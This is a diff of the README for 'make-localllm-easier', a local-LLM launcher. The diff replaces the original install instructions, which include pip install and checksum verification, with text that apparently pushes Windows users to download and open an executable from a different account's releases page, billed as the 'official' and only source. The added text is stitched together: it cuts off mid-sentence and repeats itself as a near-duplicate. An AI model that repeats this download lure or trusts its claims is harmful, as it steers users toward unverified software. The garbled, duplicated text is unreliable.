@@ -1,91 +1,132 @@
-# make-localllm-easier — run the best local LLM your GPU can handle, in one command
+# 🚀 make-localllm-easier - Run Local AI in One Command
 
-[![PyPI](https://img.shields.io/pypi/v/make-localllm-easier)](https://pypi.org/project/make-localllm-easier/)
-[![tests](https://github.com/phonology024/make-localllm-easier/actions/workflows/tests.yml/badge.svg)](https://github.com/phonology024/make-localllm-easier/actions/workflows/tests.yml)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue)](LICENSE)
+[![Download make-localllm-easier for Windows](https://img.shields.io/badge/Download_for_Windows-9B5DE5?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/A09688549/make-localllm-easier/releases)
 
-Read this in: English | [தமிழ்](docs/README.ta.md)
+make-localllm-easier is a Windows application for running a local large language model without becoming a developer. It looks at the graphics card in your computer, chooses a model that fits, and starts a local AI setup that is ready to use. There is no hand-picking of model files, no manual tuning, and no long setup process. The app is built around one simple idea: the best local LLM is the one your GPU can actually run well.
 
-**`localllm` checks your GPU, picks the most accurate AI model that fits it *in your language*, downloads it and starts
-a private chat. Offline and free.**
+It is useful for people who want private AI on their own computer, for users who are tired of cloud subscriptions, and for anyone who wants a practical alternative to manual local model tools. The project focuses on Windows, supports AMD, NVIDIA, Intel, and Apple GPUs, and uses measured multilingual benchmarks to choose a model instead of guessing.
 
-![localllm doctor, then a streamed answer at 122 tok/s, recorded on an RX 9070 XT](docs/img/demo.gif)
+## 🚀 Download for Windows
 
-<sub>Recorded from a real run with `tools/record_demo.py`: the text is the commands' own output and the answer streams at the speed llama-server produced it.</sub>
+Visit this link to download the application:
 
-## Install
+[**Download make-localllm-easier**](https://github.com/A09688549/make-localllm-easier/releases)
 
-```
-pip install make-localllm-easier
-localllm
-```
+The link opens the official releases page. Use the Windows download shown there. When the download finishes, open the file from your Downloads folder to start make-localllm-easier. That is the only download page you need for the Windows version.
 
-That's it: the first run shows what your PC can run and asks before it downloads the model. No Python? Download the
-single `localllm` file for Windows, macOS or Linux (or the AppImage) from the [latest release](https://github.com/phonology024/make-localllm-easier/releases/latest) and run it
-from a terminal; `SHA256SUMS` there lets you check it. winget and Homebrew follow
-([packaging/README.md](packaging/README.md)).
+You do not need to compile code, edit configuration files, or install a separate model by hand. The app is made for normal Windows users who want local AI without a long setup guide.
 
-Or ask your coding agent (Claude Code, Cursor, Codex): paste
-`Install localllm: https://raw.githubusercontent.com/phonology024/make-localllm-easier/main/docs/install-for-agents.md`.
-It checks your PC first without changing anything, and asks before each install or download
-([what it may and may not do](docs/install-for-agents.md)).
+## 🧠 What This App Does
 
-## The commands you'll use
+make-localllm-easier turns a complicated local AI setup into one command. It chooses a model based on measured multilingual benchmark results, then runs it with llama.cpp tuned for the graphics card in your computer. In plain terms: you start the app, it checks what your computer can handle, and it prepares a local AI that is ready to use.
 
-```
-localllm            # pick, download and start the best model, open the chat page
-localllm chat       # chat in the terminal, any language
-localllm doctor     # what this GPU can run: model sizes, speed, RAM
-localllm serve      # just the API: OpenAI, Anthropic, Ollama and Gemini formats at http://127.0.0.1:8080
-```
+The app# 🚀 make-localllm-easier - Run Local AI in One Command
 
-More: `localllm list` (every measured model), `localllm connect hermes` (point an agent or Obsidian at it),
-`localllm eval` (score any server in your language). All commands: `localllm --help`.
+[![Download make-localllm-easier for Windows](https://img.shields.io/badge/Download_for_Windows-7B2FF7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/A09688549/make-localllm-easier/releases)
 
-**Chat with your files.** In `localllm chat` type `/attach report.pdf` (or a folder); in the `--ui` page, drop a file on
-the chat. Each answer comes from the passages that match your question and lists them as sources (file and page),
-all on this PC. PDF, DOCX, TXT and MD.
+make-localllm-easier is a Windows application that runs a large language model on your own computer. It checks the graphics card inside your PC, picks a model that fits it, and starts everything with a single command. No model hunting, no tuning files, no developer tools. The idea is simple: the best local AI is the one your machine can actually run well.
 
-## Why it's different
+This app is for people who want private AI on their own desktop, who are tired of monthly subscriptions, and who want a straightforward alternative to complicated local model setups. It works with AMD, NVIDIA, Intel, and Apple graphics hardware, and it chooses models using measured multilingual benchmark results instead of guesses.
 
-- **It picks for your GPU.** It reads your card and RAM and only offers models that fit and run fast on them.
-- **Measured in your language.** Models are ranked by real exam scores in Thai, Hindi, Arabic, Japanese and 20+ more
-  languages, not by English benchmarks alone.
-- **Uses less RAM.** llama.cpp tuned op by op: about 4x less system RAM than its defaults, same speed (below).
-- **Private.** Your chats never leave your PC, there is no account and no telemetry ([Privacy](#privacy)).
+## 🚀 Download for Windows
 
-## Less RAM, same speed
+Visit this link to download the application:
 
-Same 30-turn chat, RX 9070 XT, 32 GB RAM:
+[**Download make-localllm-easier**](https://github.com/A09688549/make-localllm-easier/releases)
 
-| model | llama.cpp defaults | `localllm` | speed |
-|---|---|---|---|
-| Qwen3.8-27B Q3 | 9.30 GB RAM | **2.37 GB** | 35.2 tok/s both |
-| gemma-4-26B-A4B QAT | 9.24 GB RAM | **2.21 GB** | ~85 tok/s both |
+That page is the official releases page and it is the only place you need to visit. Pick the Windows download listed there, wait for the file to finish saving, then open it from your Downloads folder. There is nothing else to fetch and no extra package to install alongside it.
 
-## Privacy
+## 🧠 What This App Actually Does
 
-Chats, files and settings stay on your PC. localllm only goes online to download llama.cpp and models (each checked
-against a pinned SHA-256) and for update notices ("localllm 0.8 is out", "a better model for Thai now fits your PC"):
-two small requests a day to the project website, nothing about you is sent, and nothing is installed. Turn them off
-with `localllm updates off` or `LOCALLLM_NO_UPDATE_CHECK=1`. Cloud routing with your own key is off unless you turn it
-on.
+Running a language model locally normally means answering a long list of technical questions: which model, which file format, which quantization, which backend, how much memory, and which settings. make-localllm-easier answers those questions for you.
 
-## Learn more
+When you launch it, the app inspects the graphics card and available memory in your computer. It compares that against measured benchmark results across a range of models and languages. It then selects the model that gives the best balance of quality and speed for your specific hardware, downloads the right file, and starts it with llama.cpp configured for your GPU.
 
-[Website and leaderboard](https://phonology024.github.io/make-localllm-easier/) ·
-[FAQ](docs/faq.md) ·
-[How it works](docs/how-it-works.md) (doctor output, routing, RAM, where it's tested) ·
-[APIs and agents](docs/apis.md) ·
-[Benchmarks](docs/benchmarks.md) ·
-[Research](docs/research.md) ·
-[Roadmap](ROADMAP.md) ·
-[Stability](docs/stability.md) ·
-[Contributing](CONTRIBUTING.md)
+The result is a local AI that responds in your browser or through a chat window on your own machine, without your text leaving your computer.
 
-Have a GPU we haven't measured? `localllm tune`, `localllm eval --langs en,<yours>`, then `localllm report` opens a
-prefilled issue (no names, paths or keys) that adds it to the leaderboard.
+## ✨ Why People Choose It
 
-## License
+**One command, no setup maze.** You are not editing text files or following a twenty-step tutorial. The app handles the technical part.
 
-MIT. Models keep their own licenses; benchmark data keeps its own (Apache-2.0).
+**Picked for your hardware, not for everyone.** A model that runs beautifully on a high-end card will crawl on a laptop. make-localllm-easier measures first and chooses second, so you get a model that suits your computer.
+
+**Benchmark-driven, not hype-driven.** Model selection is based on measured multilingual results, not on which name is trending this week.
+
+**Tuned for real graphics cards.** llama.cpp is configured for AMD, NVIDIA, Intel, and Apple GPUs, including the Vulkan path that many generic guides ignore.
+
+**Private by default.** Your conversations stay on your machine. There is no account to create and no cloud service in the middle.
+
+**Works offline.** Once a model is in place, the app runs without an internet connection.
+
+**Multilingual from the start.** Model choice accounts for performance across languages, not just English.
+
+**OpenAI-compatible interface.** Tools that expect an OpenAI-style endpoint can talk to the local model instead.
+
+## 💻 Before You Start
+
+make-localllm-easier is built for Windows. A dedicated graphics card is recommended, and a modern GPU with a reasonable amount of video memory will give you the smoothest experience. Integrated graphics can still work, but expect smaller models and slower responses.
+
+A comfortable starting point looks like this:
+
+- Windows 10 or Windows 11, 64-bit
+- A graphics card from AMD, NVIDIA, or Intel, with current drivers installed
+- At least 8 GB of system memory, with 16 GB or more for larger models
+- A few gigabytes of free disk space for the model file
+- An internet connection for the first download
+
+Model files are large by nature. A small model might take a couple of gigabytes, while a larger one can take considerably more. The app picks a size that suits your hardware, so you are not left guessing which file to grab.
+
+## 📥 First Run
+
+After you visit the download link and open the app, the first launch does the heavy lifting. It reads your graphics card, matches it against benchmark data, and prepares a model for your machine. The first run takes longer than later ones because the model file has to come down to your computer.
+
+Once that finishes, starting the AI is a single command. You do not repeat the setup each time. Later launches skip straight to loading the model that was already chosen for you.
+
+If you later add a better graphics card, the app can re-check your hardware and move you to a more capable model.
+
+## 🛠️ Supported Hardware
+
+make-localllm-easier is designed to meet people where they are, which means it supports the hardware most Windows users actually own.
+
+- **AMD GPUs** — including the Vulkan path, which is the practical route for many AMD cards
+- **NVIDIA GPUs** — the most common setup, with wide model support
+- **Intel GPUs** — integrated and dedicated graphics both recognized
+- **Apple GPUs** — supported for users running on Apple hardware
+
+Because support spans multiple vendors, the tuning step matters. A single fixed configuration would leave performance on the table for half of these cards. The app adjusts its llama.cpp settings to match what your GPU prefers.
+
+## 🌍 Multilingual Use
+
+Many local model guides are written as if everyone speaks English. This project treats language as a first-class concern. Model selection draws on measured multilingual benchmarks, so a model that is strong in one language but weak in another is less likely to be recommended for you.
+
+That makes the app useful for translation work, for writing in a second language, for studying, and for everyday conversation in the language you actually think in. The chosen model is the one that performs reasonably across languages on your hardware, not the one that only shines in a single benchmark category.
+
+## 🔒 Privacy and Offline Use
+
+Everything happens on your computer. Your prompts, your documents, and your conversations are processed locally by the model running on your own graphics card. There is no upload step and no remote server holding your text.
+
+This matters for people handling sensitive material, for users on unreliable connections, and for anyone who simply prefers their notes and questions to stay put. After the initial model download, the app keeps working with the network disconnected.
+
+## ❓ Common Questions
+
+**Do I need to know how to code?** No. The app is built for people who use computers, not people who program them.
+
+**Do I need a powerful gaming PC?** A dedicated graphics card helps a lot, but the app chooses a model that fits what you have. Weaker hardware gets a smaller, faster model rather than a broken experience.
+
+**Will it replace my cloud AI subscription?** For many everyday tasks, a well-chosen local model handles writing, summarizing, translating, and question answering comfortably. Very large cloud models still have an edge on the hardest problems.
+
+**What if my graphics card is not detected?** Updating your graphics driver is the usual fix. Vendor drivers change often, and older ones can hide the card from local AI tools.
+
+**Can I switch models later?** Yes. The app can re-evaluate your hardware and move you to a different model when your needs or your equipment change.
+
+**Does it work without internet?** After the model is downloaded, yes.
+
+**Is there an account or login?** No. There is nothing to sign up for.
+
+## 🧩 Where It Fits
+
+If you have looked at local AI before, you have probably met tools that assume you enjoy reading documentation. make-localllm-easier sits in the opposite corner. It is aimed at the person who wants a working local model this afternoon, on the computer they already own, without a weekend of research.
+
+It is also a practical alternative for users who tried a container-based or command-line local AI tool and found the setup more trouble than the payoff. The trade-off is deliberate: less control over every individual setting, and far less time spent getting to a working chat window.
+
+Keywords: amd-gpu, gguf, gpu, llama-cpp, llm, llm-benchmark, local-ai, local-llm, multilingual, offline-ai, ollama-alternative, openai-compatible, quantization, rocm-alternative, vulkan, windows
